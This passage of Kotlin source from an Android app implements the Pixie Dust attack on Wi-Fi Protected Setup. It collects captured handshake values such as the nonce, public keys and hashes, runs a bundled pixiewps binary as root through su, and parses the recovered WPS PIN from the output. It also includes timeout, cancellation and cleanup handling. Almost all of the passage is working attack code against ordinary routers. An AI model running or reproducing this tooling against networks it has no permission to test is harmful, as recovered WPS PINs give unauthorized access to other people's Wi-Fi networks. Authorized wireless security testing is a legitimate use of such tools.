            } catch (e: Exception) {
                Log.w(TAG, "Error stopping system services", e)
                callbacks.onLogEntry(LogEntry("Error stopping services: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun extractPixieData(extractionTimeout: Long = 30000L): PixieAttackData? {
        return withContext(Dispatchers.IO) {
            val startTime = System.currentTimeMillis()

            while (System.currentTimeMillis() - startTime < extractionTimeout) {
                Log.d(TAG, "Current pixieData size: ${pixieData.size}, keys: ${pixieData.keys}")

                if (pixieData.size >= 6) {
                    val enrolleeNonce = pixieData["enrolleeNonce"]
                    val ownPublicKey = pixieData["ownPublicKey"]
                    val peerPublicKey = pixieData["peerPublicKey"]
                    val authenticationKey = pixieData["authenticationKey"]
                    val hashOne = pixieData["hashOne"]
                    val hashTwo = pixieData["hashTwo"]

                    if (enrolleeNonce != null && ownPublicKey != null && peerPublicKey != null &&
                        authenticationKey != null && hashOne != null && hashTwo != null) {

                        Log.d(TAG, "All required pixie data collected successfully")
                        return@withContext PixieAttackData(
                            enrolleeNonce = enrolleeNonce,
                            ownPublicKey = ownPublicKey,
                            peerPublicKey = peerPublicKey,
                            authenticationKey = authenticationKey,
                            hashOne = hashOne,
                            hashTwo = hashTwo
                        )
                    }
                }

                if (attackJob?.isCancelled == true) {
                    Log.d(TAG, "Attack was cancelled during data extraction")
                    return@withContext null
                }

                delay(100)
            }

            Log.w(TAG, "Timeout waiting for pixie data. Final data: $pixieData")
            forceStopAllProcesses()
            null
        }
    }

    private fun extractHexDataClean(line: String): String? {
        return try {
            val hexdumpIndex = line.indexOf("hexdump(len=")
            if (hexdumpIndex == -1) return null

            val colonIndex = line.indexOf(":", hexdumpIndex)
            if (colonIndex == -1) return null

            val hexPart = line.substring(colonIndex + 1).trim()
            if (hexPart.contains("[REMOVED]") || hexPart.contains("[NULL]")) {
                return hexPart
            }

            hexPart.replace("\\s+".toRegex(), "")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to extract hex data from: $line", e)
            null
        }
    }

    @SuppressLint("LongLogTag")
    private suspend fun executePixieAttack(data: PixieAttackData, computationTimeout: Long = 300000L): String? {
        return withContext(Dispatchers.IO) {
            try {
                callbacks.onLogEntry(LogEntry("Executing pixiedust binary", LogColorType.INFO))

                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
                val command = "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && " +
                        "./pixiedust$arch --force ${data.toCommandArgs()}"

                Log.d(TAG, "Executing pixie attack with command: $command")

                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))

                val outputReader = BufferedReader(InputStreamReader(process.inputStream))
                val errorReader = BufferedReader(InputStreamReader(process.errorStream))

                val outputLines = mutableListOf<String>()
                val errorLines = mutableListOf<String>()

                val outputJob = scope.async {
                    try {
                        var line: String?
                        while (outputReader.readLine().also { line = it } != null) {
                            line?.let {
                                outputLines.add(it)
                                parsePixieDustLine(it)
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Error reading pixiedust output", e)
                    }
                }

                val errorJob = scope.async {
                    try {
                        var line: String?
                        while (errorReader.readLine().also { line = it } != null) {
                            line?.let {
                                errorLines.add(it)
                                Log.w("${TAG}_PIXIEDUST_ERR", it)
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Error reading pixiedust error output", e)
                    }
                }

                val timeoutJob = scope.async {
                    delay(computationTimeout)
                    if (isProcessAlive(process)) {
                        Log.w(TAG, "PixieDust timeout reached (${computationTimeout/1000} sec), killing process")
                        callbacks.onLogEntry(LogEntry("PixieDust timeout - some devices need more time", LogColorType.ERROR))
                        process.destroy()
                    }
                }

                val exitCode = process.waitFor()
                timeoutJob.cancel()

                outputJob.await()
                errorJob.await()

                outputReader.close()
                errorReader.close()

                Log.d(TAG, "pixiedust finished with exit code: $exitCode")
                callbacks.onLogEntry(LogEntry("PixieDust computation completed", LogColorType.INFO))

                parsePixieOutput(outputLines.joinToString("\n"))

            } catch (e: Exception) {
                Log.e(TAG, "PixieDust execution error", e)
                callbacks.onLogEntry(LogEntry("PixieDust execution error: ${e.message}", LogColorType.ERROR))
                null
            }
        }
    }

    private fun isProcessAlive(process: Process): Boolean {
        return try {
            process.exitValue()
            false
        } catch (_: IllegalThreadStateException) {
            true
        }
    }

    @SuppressLint("LongLogTag")
    private fun parsePixieDustLine(line: String) {
        Log.d("PIXIEDUST", "Output: $line")

        when {
            line.contains("Pixiewps") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_starting_pixiewps), LogColorType.SUCCESS))
            }
            line.contains("WPS pin", ignoreCase = true) -> {
                val parts = line.split(":")
                if (parts.size >= 2) {
                    val pin = parts[1].trim()
                    Log.d(TAG, "pixiedust: PIN found: $pin")
                    pixieData["wpsPin"] = pin
                }
            }
            line.contains("WPS pin not found", ignoreCase = true) || line.contains("[-] WPS pin not found") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_pin_not_found), LogColorType.ERROR))
            }
            line.contains("Time taken:") -> {
                val timeMatch = "Time taken: (.+)".toRegex().find(line)
                timeMatch?.let {
                    val timeStr = it.groupValues[1]
                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_time_taken, timeStr), LogColorType.INFO))
                }
            }
            line.contains("error", ignoreCase = true) -> {
                Log.w(TAG, "pixiedust: Error: $line")
            }
        }
    }

    private fun parsePixieOutput(output: String): String? {
        Log.d(TAG, "Parsing pixie output (${output.length} chars)")

        val lines = output.lines()
        for (line in lines) {
            when {
                line.contains("not found", ignoreCase = true) -> {
                    Log.d(TAG, "PIN not found in line: $line")
                    return null
                }
                line.contains("WPS pin", ignoreCase = true) -> {
                    val parts = line.split(":")
                    if (parts.size >= 2) {
                        val pin = parts[1].trim()
                        Log.d(TAG, "PIN found in output: $pin")
                        return pin
                    }
                }
            }
        }

        val storedPin = pixieData["wpsPin"]
        if (storedPin != null) {
            Log.d(TAG, "Using stored PIN from parsing: $storedPin")
            return storedPin
        }

        Log.w(TAG, "No PIN found in output")
        return null
    }

    fun stopAttack() {
        if (stoppingJob?.isActive == true) {
            Log.w(TAG, "Attack stopping already in progress")
            return
        }

        Log.d(TAG, "Stopping attack manually")
        callbacks.onLogEntry(LogEntry("Attack stopped by user", LogColorType.ERROR))

        attackJob?.cancel()

        stoppingJob = scope.launch {
            try {
                forceStopAllProcesses()
                delay(2000)
                cleanupAfterAttack()

                withContext(Dispatchers.Main) {
                    callbacks.onStateChanged(PixieAttackState.Idle)
                    callbacks.onProgressUpdate("Attack stopped")
                }
            } finally {
                stoppingJob = null
            }
        }
    }

    fun cleanup() {
        stopAttack()
        scope.cancel()
    }

    fun isCopyingBinaries(): Boolean = copyingJob?.isActive == true
    fun isCleaningBinaries(): Boolean = cleanupJob?.isActive == true
    fun isAttackRunning(): Boolean = attackJob?.isActive == true
    fun isStoppingAttack(): Boolean = stoppingJob?.isActive == true
}